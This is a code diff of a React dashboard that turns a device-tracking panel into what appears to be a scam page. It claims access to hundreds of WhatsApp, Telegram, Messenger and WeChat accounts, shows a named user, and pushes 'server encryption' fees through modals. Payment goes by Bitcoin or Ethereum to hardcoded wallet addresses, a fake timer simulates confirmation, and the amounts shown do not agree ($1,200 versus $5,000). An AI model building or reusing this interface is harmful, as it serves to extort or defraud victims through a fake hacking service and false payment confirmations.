@@ -1,8 +1,11 @@
 import React, { useState } from 'react';
-import { motion } from 'framer-motion';
+import { motion, AnimatePresence } from 'framer-motion';
+import { FaFacebookMessenger, FaFile, FaMoneyBill } from "react-icons/fa";
 import { 
   FaMobile, 
   FaMapMarkerAlt, 
+  FaWhatsapp,
+  FaTelegramPlane,
   FaUnlock, 
   FaShieldAlt, 
   FaChartLine, 
@@ -18,71 +21,97 @@ import {
   FaHistory,
   FaExclamationTriangle,
   FaCheckCircle,
-  FaClock
+  FaClock,
+  FaTelegram,
+  FaTimes,
+  FaBitcoin,
+  FaEthereum,
+  FaCopy,
+  FaCheck
 } from 'react-icons/fa';
+import { RiVipDiamondFill, RiVipDiamondLine } from "react-icons/ri";
 import { IoIosStats, IoMdPhonePortrait } from 'react-icons/io';
+import { IoLogoWechat } from "react-icons/io5";
 
 const Dashboard = () => {
   const [activeTab, setActiveTab] = useState('overview');
-  const [devices, setDevices] = useState([
+  const [showEncryptionModal, setShowEncryptionModal] = useState(false);
+  const [showPaymentModal, setShowPaymentModal] = useState(false);
+  const [showPaymentCheck, setShowPaymentCheck] = useState(false);
+  const [selectedPaymentAmount, setSelectedPaymentAmount] = useState(600); // 50% of $2500
+  const [paymentMethod, setPaymentMethod] = useState('bitcoin');
+  const [paymentStatus, setPaymentStatus] = useState('pending');
+  
+  // Configurable amount - you can change this value
+  const totalEncryptionCost = 5000;
+  const amountPaid = 1200; // Example paid amount - you can update this
+
+  const devices = [
     {
       id: 1,
-      name: 'iPhone 15 Pro',
-      status: 'active',
-      type: 'iOS',
+      status: 'tracking',
+      type: 'Number',
       lastSeen: '2 minutes ago',
       location: 'New York, NY',
       battery: 85,
       isLocked: false,
-      imei: '358901052364810'
+      imei: '+'
     },
-    {
-      id: 2,
-      name: 'Samsung Galaxy S23',
-      status: 'tracking',
-      type: 'Android',
-      lastSeen: '5 minutes ago',
-      location: 'Los Angeles, CA',
-      battery: 42,
-      isLocked: true,
-      imei: '359098071234567'
-    },
-    {
-      id: 3,
-      name: 'iPad Pro',
-      status: 'offline',
-      type: 'iOS',
-      lastSeen: '1 hour ago',
-      location: 'Chicago, IL',
-      battery: 0,
-      isLocked: false,
-      imei: '358901052364811'
-    }
-  ]);
+  ];
 
   const stats = [
-    { label: 'Total Devices', value: '12', icon: FaMobile, color: 'cyan' },
-    { label: 'Active Tracking', value: '8', icon: FaMapMarkerAlt, color: 'green' },
-    { label: 'Unlocked Devices', value: '9', icon: FaUnlock, color: 'amber' },
-    { label: 'Security Alerts', value: '2', icon: FaShieldAlt, color: 'red' }
+    { label: 'Total Devices', value: '999+', icon: FaWhatsapp, color: 'green' },
+    { label: 'Active Tracking', value: '70', icon: FaTelegramPlane, color: 'cyan' },
+    { label: 'Unlocked Devices', value: '999+', icon: FaFacebookMessenger, color: 'blue' },
+    { label: 'Security Alerts', value: '30', icon: IoLogoWechat, color: 'green' },
+    { label: 'Security Alerts', value: '999+', icon: FaFile, color: 'cyan' }
   ];
 
-  const recentActivities = [
-    { action: 'Device Unlocked', device: 'iPhone 15 Pro', time: '2 min ago', status: 'success' },
-    { action: 'Location Tracked', device: 'Samsung S23', time: '5 min ago', status: 'info' },
-    { action: 'Security Alert', device: 'iPad Pro', time: '1 hour ago', status: 'warning' },
-    { action: 'Device Added', device: 'Google Pixel 8', time: '2 hours ago', status: 'success' }
-  ];
+  
+
+  const cryptoWallets = {
+    bitcoin: 'bc1q3ha0xm39g58mcn7kkmsmll8jceapty83xfuwl7',
+    ethereum: '0xe7D36c7D0b102C55030225A0CcDf3e69516A7326'
+  };
+
+  const handleStatClick = () => {
+    setShowEncryptionModal(true);
+  };
+
+  const handleEncryptNow = () => {
+    setShowEncryptionModal(false);
+    setShowPaymentModal(true);
+  };
+
+  const handlePaymentSubmit = async () => {
+    // Simulate payment processing
+    setPaymentStatus('processing');
+    await new Promise(resolve => setTimeout(resolve, 3000));
+    setPaymentStatus('completed');
+    
+    // After payment completion, show success and close modal
+    setTimeout(() => {
+      setShowPaymentModal(false);
+      setPaymentStatus('pending');
+    }, 2000);
+  };
+
+  const copyToClipboard = (text) => {
+    navigator.clipboard.writeText(text);
+    // You can add a toast notification here
+    alert('Wallet address copied to clipboard!');
+  };
+
+  const paymentPercentage = (amountPaid / totalEncryptionCost) * 100;
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-teal-900">
       {/* Header */}
-      <header className="bg-black/80 backdrop-blur-xl border-b border-cyan-500/20">
+      <header className="bg-black/80 backdrop-blur-xl sticky top-0 z-50 border-b border-cyan-500/20">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex justify-between items-center py-4">
             <div className="flex items-center gap-3">
-              <IoMdPhonePortrait className="text-cyan-400 text-2xl" />
-              <span className="text-white font-bold text-xl"></span>
+              <span className="text-white font-bold text-xl">DashBoard</span>
             </div>
             
             <div className="flex items-center gap-6">
@@ -94,7 +123,7 @@ const Dashboard = () => {
                 <div className="w-8 h-8 bg-cyan-500 rounded-full flex items-center justify-center">
                   <FaUser className="text-white text-sm" />
                 </div>
-                <span className="text-white font-medium">Admin User</span>
+                <span className="text-white font-medium">Mattew Bower</span>
               </div>
             </div>
           </div>
@@ -113,14 +142,15 @@ const Dashboard = () => {
         </motion.div>
 
         {/* Stats Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-6 mb-8">
           {stats.map((stat, index) => (
             <motion.div
               key={stat.label}
               initial={{ opacity: 0, y: 20 }}
               animate={{ opacity: 1, y: 0 }}
               transition={{ delay: index * 0.1 }}
-              className="bg-white/5 backdrop-blur-sm rounded-2xl p-6 border border-white/10 hover:border-cyan-500/30 transition-all duration-300"
+              onClick={handleStatClick}
+              className="bg-white/5 backdrop-blur-sm rounded-2xl p-6 border border-white/10 hover:border-cyan-500/30 transition-all duration-300 cursor-pointer"
             >
               <div className="flex items-center justify-between">
                 <div>
@@ -145,14 +175,6 @@ const Dashboard = () => {
             >
               <div className="flex items-center justify-between mb-6">
                 <h2 className="text-2xl font-bold text-white">Managed Devices</h2>
-                <div className="flex gap-3">
-                  <button className="bg-cyan-500/10 text-cyan-400 px-4 py-2 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors">
-                    Add Device
-                  </button>
-                  <button className="bg-white/5 text-white px-4 py-2 rounded-lg border border-white/10 hover:bg-white/10 transition-colors">
-                    <FaSync className="text-sm" />
-                  </button>
-                </div>
               </div>
 
               <div className="space-y-4">
@@ -164,39 +186,18 @@ const Dashboard = () => {
                   >
                     <div className="flex items-center justify-between">
                       <div className="flex items-center gap-4">
-                        <div className={`p-3 rounded-lg ${
-                          device.status === 'active' ? 'bg-green-500/10' : 
-                          device.status === 'tracking' ? 'bg-blue-500/10' : 'bg-gray-500/10'
-                        }`}>
-                          <FaMobile className={
-                            device.status === 'active' ? 'text-green-400' : 
-                            device.status === 'tracking' ? 'text-blue-400' : 'text-gray-400'
-                          } />
+                        <div className={`p-3 rounded-lg bg-blue-500/10`}>
+                          <FaMobile className="text-blue-400" />
                         </div>
                         <div>
-                          <h3 className="text-white font-semibold">{device.name}</h3>
-                          <p className="text-gray-400 text-sm">{device.type} • {device.imei}</p>
+                          <h3 className="text-white text-lg">{device.type} • {device.imei}</h3>
                           <div className="flex items-center gap-4 mt-2">
-                            <span className={`inline-flex items-center gap-1 text-xs px-2 py-1 rounded-full ${
-                              device.status === 'active' ? 'bg-green-500/20 text-green-400' : 
-                              device.status === 'tracking' ? 'bg-blue-500/20 text-blue-400' : 'bg-gray-500/20 text-gray-400'
-                            }`}>
+                            <span className="inline-flex items-center gap-1 text-xs px-2 py-1 rounded-full bg-blue-500/20 text-blue-400">
                               {device.status}
                             </span>
                             <span className="text-gray-400 text-xs">{device.lastSeen}</span>
                           </div>
                         </div>
-                      </div>
-                      <div className="flex items-center gap-3">
-                        <button className="p-2 bg-cyan-500/10 text-cyan-400 rounded-lg hover:bg-cyan-500/20 transition-colors">
-                          <FaMapMarkerAlt />
-                        </button>
-                        <button className="p-2 bg-amber-500/10 text-amber-400 rounded-lg hover:bg-amber-500/20 transition-colors">
-                          {device.isLocked ? <FaLock /> : <FaUnlock />}
-                        </button>
-                        <button className="p-2 bg-white/5 text-white rounded-lg hover:bg-white/10 transition-colors">
-                          <FaCog />
-                        </button>
                       </div>
                     </div>
                   </motion.div>
@@ -207,34 +208,6 @@ const Dashboard = () => {
 
           {/* Sidebar */}
           <div className="space-y-6">
-            {/* Recent Activity */}
-            <motion.div
-              initial={{ opacity: 0, x: 20 }}
-              animate={{ opacity: 1, x: 0 }}
-              className="bg-white/5 backdrop-blur-sm rounded-2xl border border-white/10 p-6"
-            >
-              <h2 className="text-2xl font-bold text-white mb-6">Recent Activity</h2>
-              <div className="space-y-4">
-                {recentActivities.map((activity, index) => (
-                  <div key={index} className="flex items-center gap-4 p-3 bg-white/5 rounded-lg">
-                    <div className={`p-2 rounded-full ${
-                      activity.status === 'success' ? 'bg-green-500/20' :
-                      activity.status === 'warning' ? 'bg-amber-500/20' : 'bg-cyan-500/20'
-                    }`}>
-                      {activity.status === 'success' ? <FaCheckCircle className="text-green-400" /> :
-                       activity.status === 'warning' ? <FaExclamationTriangle className="text-amber-400" /> :
-                       <FaClock className="text-cyan-400" />}
-                    </div>
-                    <div className="flex-1">
-                      <p className="text-white text-sm font-medium">{activity.action}</p>
-                      <p className="text-gray-400 text-xs">{activity.device}</p>
-                    </div>
-                    <span className="text-gray-400 text-xs">{activity.time}</span>
-                  </div>
-                ))}
-              </div>
-            </motion.div>
-
             {/* Quick Actions */}
             <motion.div
               initial={{ opacity: 0, x: 20 }}
@@ -242,18 +215,19 @@ const Dashboard = () => {
               transition={{ delay: 0.2 }}
               className="bg-white/5 backdrop-blur-sm rounded-2xl border border-white/10 p-6"
             >
-              <h2 className="text-2xl font-bold text-white mb-6">Quick Actions</h2>
+              <h2 className="text-2xl font-bold text-white mb-6">Server Details</h2>
               <div className="grid grid-cols-2 gap-4">
                 {[
-                  { icon: FaSearch, label: 'Track Device', color: 'cyan' },
-                  { icon: FaUnlock, label: 'Unlock', color: 'green' },
-                  { icon: FaShieldAlt, label: 'Security', color: 'amber' },
-                  { icon: FaDatabase, label: 'Backup', color: 'purple' }
+                  { icon: RiVipDiamondFill, label: 'Vip Active', color: 'amber', onClick: () => {} },
+                  { icon: FaMoneyBill, label: 'Check Payment', color: 'green', onClick: () => setShowPaymentCheck(true) },
+                  { icon: FaShieldAlt, label: 'Security 100%', color: 'amber', onClick: () => {} },
+                  { icon: FaDatabase, label: 'Backup', color: 'purple', onClick: () => {} }
                 ].map((action, index) => (
                   <motion.button
                     key={action.label}
                     whileHover={{ scale: 1.05 }}
                     whileTap={{ scale: 0.95 }}
+                    onClick={action.onClick}
                     className={`p-4 bg-${action.color}-500/10 border border-${action.color}-500/20 rounded-xl hover:bg-${action.color}-500/20 transition-all duration-300`}
                   >
                     <action.icon className={`text-${action.color}-400 text-xl mb-2`} />
@@ -265,6 +239,316 @@ const Dashboard = () => {
           </div>
         </div>
       </div>
+
+      {/* Encryption Required Modal */}
+      <AnimatePresence>
+        {showEncryptionModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4"
+          >
+            <motion.div
+              initial={{ scale: 0.9, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.9, opacity: 0 }}
+              className="bg-slate-800/90 backdrop-blur-xl rounded-2xl border border-cyan-500/20 p-8 max-w-md w-full"
+            >
+              <div className="flex items-center justify-between mb-6">
+                <div className="flex items-center gap-3">
+                  <FaShieldAlt className="text-cyan-400 text-2xl" />
+                  <h2 className="text-2xl font-bold text-white">Server Encryption Required</h2>
+                </div>
+                <button
+                  onClick={() => setShowEncryptionModal(false)}
+                  className="text-gray-400 hover:text-white transition-colors"
+                >
+                  <FaTimes className="text-xl" />
+                </button>
+              </div>
+
+              <div className="space-y-4 mb-6">
+                <p className="text-gray-300">
+                  To access detailed analytics and advanced features, you need to encrypt your server infrastructure.
+                </p>
+                <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4">
+                  <h3 className="text-amber-400 font-semibold mb-2">Total Encryption Cost: $1,200</h3>
+                  <p className="text-amber-300 text-sm">
+                    One-time payment for lifetime server encryption and security features.
+                  </p>
+                </div>
+              </div>
+
+              <div className="flex gap-4">
+                <button
+                  onClick={() => setShowEncryptionModal(false)}
+                  className="flex-1 bg-white/5 border border-white/10 text-white py-3 px-4 rounded-xl hover:bg-white/10 transition-all duration-300"
+                >
+                  Later
+                </button>
+                <button
+                  onClick={handleEncryptNow}
+                  className="flex-1 bg-gradient-to-r from-cyan-500 to-blue-500 text-white py-3 px-4 rounded-xl hover:from-cyan-600 hover:to-blue-600 transition-all duration-300 font-semibold"
+                >
+                  Encrypt Now
+                </button>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Payment Modal */}
+      <AnimatePresence>
+        {showPaymentModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4"
+          >
+            <motion.div
+              initial={{ scale: 0.9, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.9, opacity: 0 }}
+              className="bg-slate-800/90 scrollbar-hide  backdrop-blur-xl rounded-2xl border border-cyan-500/20 p-8 max-w-2xl w-full max-h-[90vh] overflow-y-auto"
+            >
+              <div className="flex items-center justify-between mb-6">
+                <div className="flex items-center gap-3">
+                  <FaShieldAlt className="text-cyan-400 text-2xl" />
+                  <h2 className="text-2xl font-bold text-white">Server Encryption Payment</h2>
+                </div>
+                <button
+                  onClick={() => setShowPaymentModal(false)}
+                  className="text-gray-400 hover:text-white transition-colors"
+                >
+                  <FaTimes className="text-xl" />
+                </button>
+              </div>
+
+              {paymentStatus === 'completed' ? (
+                <div className="text-center py-8">
+                  <motion.div
+                    initial={{ scale: 0 }}
+                    animate={{ scale: 1 }}
+                    className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4"
+                  >
+                    <FaSync className="text-white text-2xl" />
+
+                  </motion.div>
+                  <h3 className="text-2xl font-bold text-white mb-2">Please Hold We are confirming your payment</h3>
+                  <p className="text-gray-300 mb-6">
+                    Your server encryption payment is being processed.
+                  </p>
+                  {/* <button
+                    onClick={() => setShowPaymentModal(false)}
+                    className="bg-cyan-500 text-white py-3 px-6 rounded-xl hover:bg-cyan-600 transition-colors"
+                  >
+                    Close
+                  </button> */}
+                </div>
+              ) : (
+                <div className="space-y-6">
+                  {/* Payment Amount Selection */}
+                  <div className="bg-white/5 rounded-xl p-6 border border-white/10">
+                    <h3 className="text-white font-semibold mb-4">Select Payment Amount</h3>
+                    <div className="grid grid-cols-2 gap-4">
+                      {[
+                        { amount: 600, label: '50% Deposit', description: '$600 - Start encryption process' },
+                        { amount: 1200, label: 'Full Payment', description: '$1,200 - Complete encryption' }
+                      ].map((option) => (
+                        <motion.button
+                          key={option.amount}
+                          whileHover={{ scale: 1.02 }}
+                          whileTap={{ scale: 0.98 }}
+                          onClick={() => setSelectedPaymentAmount(option.amount)}
+                          className={`p-4 rounded-lg border-2 transition-all text-left ${
+                            selectedPaymentAmount === option.amount
+                              ? 'border-cyan-500 bg-cyan-500/10'
+                              : 'border-white/10 bg-white/5 hover:border-white/20'
+                          }`}
+                        >
+                          <div className="text-2xl font-bold text-white">${option.amount}</div>
+                          <div className="text-slate-400 text-sm font-semibold">{option.label}</div>
+                          <div className="text-slate-500 text-xs mt-1">{option.description}</div>
+                        </motion.button>
+                      ))}
+                    </div>
+                  </div>
+
+                  {/* Payment Method */}
+                  <div className="bg-white/5 rounded-xl p-6 border border-white/10">
+                    <h3 className="text-white font-semibold mb-4">Payment Method</h3>
+                    <div className="grid grid-cols-2 gap-4">
+                      {[
+                        { method: 'bitcoin', icon: FaBitcoin, label: 'Bitcoin' },
+                        { method: 'ethereum', icon: FaEthereum, label: 'Ethereum' }
+                      ].map(({ method, icon: Icon, label }) => (
+                        <motion.button
+                          key={method}
+                          whileHover={{ scale: 1.02 }}
+                          whileTap={{ scale: 0.98 }}
+                          onClick={() => setPaymentMethod(method)}
+                          className={`p-4 rounded-lg border-2 transition-all ${
+                            paymentMethod === method
+                              ? 'border-cyan-500 bg-cyan-500/10'
+                              : 'border-white/10 bg-white/5 hover:border-white/20'
+                          }`}
+                        >
+                          <Icon className={`text-2xl mb-2 ${
+                            paymentMethod === method ? 'text-cyan-400' : 'text-slate-400'
+                          }`} />
+                          <div className="text-white text-sm">{label}</div>
+                        </motion.button>
+                      ))}
+                    </div>
+                  </div>
+
+                  {/* Payment Details */}
+                  <div className="bg-white/5 rounded-xl p-6 border border-white/10">
+                    <h3 className="text-white font-semibold mb-4">Payment Details</h3>
+                    <div className="space-y-4">
+                      <div className="flex justify-between items-center p-3 bg-black/20 rounded-lg">
+                        <span className="text-slate-400">Amount to Pay:</span>
+                        <span className="text-white font-mono text-xl">${selectedPaymentAmount} USD</span>
+                      </div>
+
+                      <div className="p-4 bg-black/30 rounded-lg border border-white/5">
+                        <div className="flex items-center justify-between mb-2">
+                          <span className="text-slate-400 text-sm">Wallet Address:</span>
+                          <button
+                            onClick={() => copyToClipboard(cryptoWallets[paymentMethod])}
+                            className="flex items-center gap-2 text-cyan-400 hover:text-cyan-300 transition-colors"
+                          >
+                            <FaCopy className="text-sm" />
+                            <span className="text-sm">Copy</span>
+                          </button>
+                        </div>
+                        <div className="font-mono text-sm text-white break-all bg-black/50 p-2 rounded">
+                          {cryptoWallets[paymentMethod]}
+                        </div>
+                      </div>
+
+                      <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4">
+                        <h4 className="text-amber-400 font-semibold mb-2">Important:</h4>
+                        <ul className="text-amber-300 text-sm space-y-1">
+                          <li>• Send exactly ${selectedPaymentAmount} USD equivalent in {paymentMethod.toUpperCase()}</li>
+                          <li>• Payment confirmation may take 10-30 minutes</li>
+                          <li>• Contact support if you encounter any issues</li>
+                        </ul>
+                      </div>
+                    </div>
+                  </div>
+
+                  <motion.button
+                    whileHover={{ scale: 1.02 }}
+                    whileTap={{ scale: 0.98 }}
+                    onClick={handlePaymentSubmit}
+                    disabled={paymentStatus === 'processing'}
+                    className="w-full bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 disabled:from-slate-600 disabled:to-slate-700 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 flex items-center justify-center gap-3"
+                  >
+                    {paymentStatus === 'processing' ? (
+                      <>
+                        <FaSync className="animate-spin" />
+                        <span>Processing Payment...</span>
+                      </>
+                    ) : (
+                      <>
+                        <FaShieldAlt />
+                        <span>Confirm Encryption Payment</span>
+                      </>
+                    )}
+                  </motion.button>
+                </div>
+              )}
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Payment Check Modal */}
+      <AnimatePresence>
+        {showPaymentCheck && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4"
+          >
+            <motion.div
+              initial={{ scale: 0.9, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.9, opacity: 0 }}
+              className="bg-slate-800/90 backdrop-blur-xl rounded-2xl border border-cyan-500/20 p-8 max-w-md w-full"
+            >
+              <div className="flex items-center justify-between mb-6">
+                <div className="flex items-center gap-3">
+                  <FaMoneyBill className="text-green-400 text-2xl" />
+                  <h2 className="text-2xl font-bold text-white">Payment Progress</h2>
+                </div>
+                <button
+                  onClick={() => setShowPaymentCheck(false)}
+                  className="text-gray-400 hover:text-white transition-colors"
+                >
+                  <FaTimes className="text-xl" />
+                </button>
+              </div>
+
+              <div className="space-y-6">
+                <div className="text-center">
+                  <div className="text-3xl font-bold text-white mb-2">${amountPaid} / ${totalEncryptionCost}</div>
+                  <p className="text-gray-400">Total Paid vs Required</p>
+                </div>
+
+                {/* Progress Bar */}
+                <div className="space-y-2">
+                  <div className="flex justify-between text-sm">
+                    <span className="text-gray-400">Progress</span>
+                    <span className="text-cyan-400">{paymentPercentage.toFixed(1)}%</span>
+                  </div>
+                  <div className="w-full bg-gray-700 rounded-full h-4">
+                    <motion.div
+                      initial={{ width: 0 }}
+                      animate={{ width: `${paymentPercentage}%` }}
+                      transition={{ duration: 1, ease: "easeOut" }}
+                      className="bg-gradient-to-r from-cyan-500 to-blue-500 h-4 rounded-full relative"
+                    >
+                      <div className="absolute right-0 top-1/2 transform -translate-y-1/2 w-2 h-2 bg-white rounded-full"></div>
+                    </motion.div>
+                  </div>
+                </div>
+
+                <div className="bg-white/5 rounded-xl p-4">
+                  <div className="space-y-2 text-sm">
+                    <div className="flex justify-between">
+                      <span className="text-gray-400">Amount Paid:</span>
+                      <span className="text-green-400">${amountPaid}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-gray-400">Remaining:</span>
+                      <span className="text-amber-400">${totalEncryptionCost - amountPaid}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-gray-400">Status:</span>
+                      <span className={paymentPercentage >= 100 ? "text-green-400" : "text-amber-400"}>
+                        {paymentPercentage >= 100 ? "Fully Paid" : "Partial Payment"}
+                      </span>
+                    </div>
+                  </div>
+                </div>
+
+                <button
+                  onClick={() => setShowPaymentCheck(false)}
+                  className="w-full bg-cyan-500 text-white py-3 px-4 rounded-xl hover:bg-cyan-600 transition-colors font-semibold"
+                >
+                  Close
+                </button>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
     </div>
   );
 };
